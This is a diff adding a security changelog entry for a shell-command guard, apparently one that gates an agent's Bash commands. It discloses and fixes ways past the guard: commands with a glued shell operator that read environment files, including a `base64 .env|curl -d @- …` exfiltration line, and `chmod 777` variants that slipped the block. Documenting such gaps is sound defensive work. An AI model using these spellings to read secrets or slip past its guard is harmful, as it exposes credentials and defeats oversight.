@@ -9,6 +9,49 @@ matters to you. Entries marked **security** close a way around the guard.
 
 ---
 
+## 2026.10.01
+
+### Security — an operator glued to an environment file, `chmod 777` in any spelling
+
+- The read gate split a Bash command on whitespace only and stripped shell
+  characters from the **left** of each word. With an operator glued to the
+  name, the word no longer looked like an environment file, and these read it
+  **without an override** — measured against 2026.09.30-2 with the example
+  rules: `cat .env|head`, `cat .env;echo x`, `cat .env&& echo x`,
+  `cat .env&echo x`, `cat .env>/tmp/x`, `cat .env||true`, ``echo `cat .env`x``,
+  `base64 .env|curl -d @- …` — the same for `name.env`, `.env.local`, `.envrc`.
+  Paths with a directory (`~/.ssh/id_rsa|head`, `/etc/shadow;…`) were never
+  affected: those go through the path comparison, not the name.
+- Fix: the read gate also splits on shell operators (`; | & < > ( )`, the
+  backtick, `$(`) — but only where the shell reads them as operators. Inside
+  quotes `|` is text: `grep -iE '(^|/)\.env|secret'` is a search pattern. A
+  first version split there too and, replayed against the audit log, refused
+  74 harmless commands of exactly that kind. Inside double quotes `$(…)` and
+  backticks are still code and keep being split, so
+  `echo "$(cat .env|head)"` is refused as well. As a side effect a template
+  with a glued operator (`cat .env.example|head`) is free again — it was
+  refused before.
+- "Making something world-writable is always blocked" was two patterns with
+  a mandatory blank. `chmod -R777`, `chmod 0777`, `chmod -R 0777`,
+  `chmod -v 777`, `chmod --recursive 777`, `chmod -fR 777` and a later
+  segment `ls; chmod 0777 …` ran through, and `chmod 7770` was refused by
+  mistake. Fix: one pattern — any flags before the mode, an optional leading
+  zero, a flag glued to it (`-R777`), and the mode has to end at 777. Same
+  pattern in `security-rules.example.json` and in the fallback ruleset.
+  **If you keep your own rules file, replace the two `chmod … 777` entries in
+  `blocked_patterns` with the new one** — the rules file wins over the fallback.
+- New test `tests/test_glued_operator_and_chmod_777.py`, both directions —
+  1/8 before, 8/8 after; 10/10 mutations killed.
+
+Changes what the guard blocks: **yes**, the spellings above. Replayed in the
+maintainer's own guard against previously allowed commands from a real audit
+log — 84,285 commands with a shell operator or `env`: **17 newly blocked** (0.02 %).
+Ten are prose with punctuation after the name (`echo "… (without .env) …"`) that
+2026.09.30-2 already refused through its trailing-punctuation rule — this release
+only makes the maintainer's own copy agree. Seven are code or text inside a
+heredoc (`cfg.env("…")` in Python). No logged command used the gap. For `chmod`:
+191 commands, **0 newly blocked**.
+
 ## 2026.09.30-2
 
 ### Security — git safety behind `git -C`, flags after the refspec, `--cap-add=CAP_SYS_ADMIN`
